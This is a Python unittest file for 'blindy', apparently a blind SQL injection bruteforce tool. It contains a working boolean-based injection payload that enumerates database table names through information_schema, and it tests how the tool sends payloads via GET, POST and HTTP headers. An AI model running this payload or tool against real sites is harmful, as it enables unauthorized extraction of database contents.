import unittest
import blindy
import re
from unittest.mock import patch, MagicMock, Mock

PARAMETERS = ['submit=true', 'admin=1', 'phrase']

SIMPLE_PHRASE_WITHOUT_PLACEHOLDER = "some phrase"

PHRASE_WITH_PLACEHOLDER = "some phrase with {} placeholder"

SIMPLE_PAYLOAD = {'submit': 'true', 'admin': '1', 'phrase': 'some+phrase'}

RESPONSE = "<html>some response</html>"

HTTP_URL = "http://url"

QUERY = "' or (select table_name from information_schema.TABLES where table_schema not in (NOTIN) limit 1) regexp '^{}'#"

PATTERN = re.compile('.*response.*')


class TestStringMethods(unittest.TestCase):

    def testCreateBruteQuery(self):
        # when
        res = blindy.createBruteQuery('word', QUERY)

        # then
        self.assertEqual(res, "' or (select table_name from information_schema.TABLES where table_schema not in (NOTIN) limit 1) regexp '^word'#")

    def testCreateWord(self):
        # when
        res = blindy.createWord('strin', 'g')
        # then
        self.assertEqual(res, 'string')

    def testSubstitutePlaceholders(self):
        # when
        res = blindy.substitutePlaceholders(QUERY)

        # then
        self.assertEqual(res, "' or (select table_name from information_schema.TABLES where table_schema not in ('information_schema','mysql','performance_schema','sys') limit 1) regexp '^{}'#")

    def testPreparePayload(self):
        # when
        res = blindy.preparePayload(PARAMETERS, SIMPLE_PHRASE_WITHOUT_PLACEHOLDER, True)

        # then
        self.assertEqual(res, SIMPLE_PAYLOAD)

    @patch('requests.get')
    def testBruteforceSimplePhraseWithoutPlaceholders(self, igr):
        # given
        igr.return_value = RESPONSE

        #when
        res = blindy.bruteforce(['submit=true', 'admin=1', 'phrase'],"word", SIMPLE_PHRASE_WITHOUT_PLACEHOLDER, HTTP_URL, igr, PATTERN, True, True)

        # then
        self.assertEqual(res, RESPONSE)
        igr.assert_called_once_with(SIMPLE_PAYLOAD, HTTP_URL)

    @patch('requests.get')
    def testInHTTPheader(self, reguests_get):
        # given
        reguests_get.return_value = MagicMock(status_code=200)

        #when
        blindy.inHTTPheader(SIMPLE_PAYLOAD, HTTP_URL)

        # then
        reguests_get.assert_called_with(HTTP_URL, headers=SIMPLE_PAYLOAD)

    @patch('requests.post')
    def testInPOSTrequest(self, reguests_post):
        # given
        reguests_post.return_value = MagicMock(status_code=200)

        #when
        blindy.inPOSTrequest(SIMPLE_PAYLOAD, HTTP_URL)

        # then
        reguests_post.assert_called_with(HTTP_URL, data=SIMPLE_PAYLOAD)\

    @patch('requests.get')
    def testInGETrequest(self, reguests_get):
        # given
        reguests_get.return_value = MagicMock(status_code=200, text='it\'s ok')

        #when
        blindy.inGETrequest(SIMPLE_PAYLOAD, HTTP_URL)

        # then
        reguests_get.assert_called_with(HTTP_URL, params=SIMPLE_PAYLOAD)

    @patch('blindy.bruteforce')
    def testRunInjectionPOST(self, bf):
        # given
        bf.return_value = RESPONSE

        # when
        blindy.runInjection("POST", PARAMETERS, [QUERY, QUERY], HTTP_URL, PATTERN, False, True)

        # then
        bf.assert_called_with(PARAMETERS, '', QUERY, HTTP_URL, blindy.inPOSTrequest, PATTERN, False, True)


    @patch('blindy.bruteforce')
    def testRunInjectionGET(self, bf):
        # given
        bf.return_value = RESPONSE

        # when
        blindy.runInjection("GET", PARAMETERS, [QUERY, QUERY], HTTP_URL, PATTERN, False, True)

        # then
        bf.assert_called_with(PARAMETERS, '', QUERY, HTTP_URL, blindy.inGETrequest, PATTERN, False, True)

    @patch('blindy.bruteforce')
    def testRunInjectionHEADER(self, bf):
        # given
        bf.return_value = RESPONSE

        # when
        blindy.runInjection("HEADER", PARAMETERS, [QUERY, QUERY], HTTP_URL, PATTERN, False, True)

        # then
        bf.assert_called_with(PARAMETERS, '', QUERY, HTTP_URL, blindy.inHTTPheader, PATTERN, False, True)

    @patch('blindy.inGETrequest')
    def testPositivePatternFound(self, igr):
        # given
        igr.side_effect = [RESPONSE if (i==20 or i==39 or i==44 or i==62) else 'Not a pattern' for i in range(0,len(blindy.chars)+20+38+44+62)]

        # when
        result = blindy.bruteforce(PARAMETERS, "", QUERY, HTTP_URL, igr, PATTERN, True, True)

        # then
        self.assertEqual(result, 'user')

    @patch('blindy.inGETrequest')
    def testNegativePatternFound(self, igr):
        # given
        igr.side_effect = ['Not a pattern' if (i==20 or i==39 or i==44 or i==62) else RESPONSE for i in range(0,len(blindy.chars)+20+38+44+62)]

        # when
        result = blindy.bruteforce(PARAMETERS, "", QUERY, HTTP_URL, igr, PATTERN, False, True)

        # then
        self.assertEqual(result, 'user')



if __name__ == '__main__':
    unittest.main()